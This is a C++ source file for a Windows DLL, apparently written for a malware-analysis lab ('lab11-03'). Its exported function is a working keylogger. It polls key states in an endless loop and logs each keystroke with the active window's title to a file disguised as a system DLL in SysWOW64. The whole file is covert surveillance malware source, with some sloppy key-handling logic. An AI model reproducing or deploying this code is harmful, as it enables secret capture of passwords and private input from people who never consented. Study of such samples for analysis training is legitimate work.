// lab11-03dll.cpp : Defines the exported functions for the DLL application.
//
#include "stdafx.h"
#define SHIFT   1
#define CONTROL 2
#define ALT     4
#define BUFFER 512
void __declspec(dllexport) __stdcall key() {
	std::fstream File;
	File.open("C://Windows//SysWOW64//kernel64x.dll", std::fstream::app);//open file
	//File.open("kernel64x.dll", std::fstream::app);//open file
	HWND hwnd = GetForegroundWindow();
	char windowtext[BUFFER] = "";
	std::string output;
	int key, state;
	bool newWindow = true;
	while (true) {
		state = 0;
		if (hwnd != GetForegroundWindow()) {//update window
			hwnd = GetForegroundWindow();
			GetWindowTextA(hwnd, windowtext, BUFFER - 1);
			output = windowtext;
			output += ": ";
			newWindow = true;
			File.flush();
		}
		key = 0;
		for (int i = 8; i <= 127; i++) {//iterate through ascii values
			if (GetAsyncKeyState(i) == -32767 && i != 16 && i != 17 && i != 18) {//if key has been pressed since last call
				key = i;
			}
		}
		if (key == 0) { //key not pressed
			continue;
		}
		if (newWindow) {//print new window name once a key is pressed
			File << std::endl;
			File << output;
			newWindow = false;
		}
		//set state values
		if (GetAsyncKeyState(16)|| GetAsyncKeyState(VK_CAPITAL))
			state |= SHIFT;
		if (GetAsyncKeyState(17))
			state |= CONTROL;
		if (GetAsyncKeyState(18))
			state |= ALT;
			
		switch (key) {
		case VK_RETURN:
			output += " <return> ";
			break;

		case VK_TAB:
			output += " <tab> ";
			break;

		case VK_BACK:
			output = " <bck> ";
			break;

		default:
			if (state & CONTROL) {
				output = " <ctrl>";
				output += key;
				output += " ";
				break;
			}
			if (state & ALT) {
				output = " <alt>";
				output += key;
				output += " ";
				break;
			}

			if (state & SHIFT) {
				output = key;
			}

			else {
				//numberpad other entry (*, +, /, -, ., ...)
				if (key >= 106 && key <= 111)
					key -= 64;

				// numberpad number entry (1, 2, 3, 4, ...)
				if (key >= 96 && key <= 105)
					key -= 48;

				// upper-case to lower-case
				if (key >= 65 && key <= 90)
					key += 32;
			}
			output = key;
			break;
		}
		File << output;//write to file
	}
}
